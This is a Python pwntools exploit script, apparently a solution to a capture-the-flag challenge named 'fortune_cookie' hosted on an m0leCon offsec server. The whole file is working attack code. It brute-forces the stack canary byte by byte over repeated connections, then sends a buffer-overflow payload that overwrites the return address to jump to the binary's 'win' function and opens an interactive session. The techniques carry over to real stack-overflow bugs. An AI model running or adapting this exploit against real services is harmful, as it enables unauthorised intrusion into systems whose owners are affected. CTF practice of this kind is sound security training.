#!/usr/bin/env python3
from pwn import *

exe = ELF('fortune_cookie', checksec=False)
context.binary = exe
context.os = 'linux'
context.arch = 'amd64'

HOST, PORT             = '127.0.0.1', 4444
OFFSECHOST, OFFSECPORT = 'offsec.m0lecon.it', 13588
OFFSET_TO_CANARY       = 72
OFFSET_TO_RIP          = 88
GADGET                 = 0x000000000040101a

def conn(interactive=False):
    if interactive:
        return remote(HOST, PORT) if args.LOCAL else remote(OFFSECHOST, OFFSECPORT)
    return remote(HOST, PORT, level='error') if args.LOCAL else remote(OFFSECHOST, OFFSECPORT, level='error')

def main():
    # use a pre-known canary with CANARY=0x... argument
    if args.CANARY:
        canary = int(args.CANARY, 16)
        log.info(f'Using supplied canary: {canary:#x}')
    else:
        known = b"\x00"
        for i in range(7):
            for bval in range(256):
                guess = known + bytes([bval])
                payload = b"A" * OFFSET_TO_CANARY + guess

                r = conn()
                r.recvuntil(b"wish\n")
                r.send(payload)
                try:
                    data = r.recv(timeout=0.2)
                except EOFError:
                    data = b""
                r.close()

                if b"OK" in data:
                    known = guess
                    log.success(f"byte {i+1}: {bval:02x}")
                    break

        canary = u64(known)
        log.info(f"Canary: {canary:#x}")

    # final exploit
    r = conn(interactive=True)
    r.recvuntil(b"wish\n")
    payload = flat(
        b"A" * OFFSET_TO_CANARY,
        p64(canary),
        b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
        p64(GADGET),
        p64(exe.sym.win),
    )
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()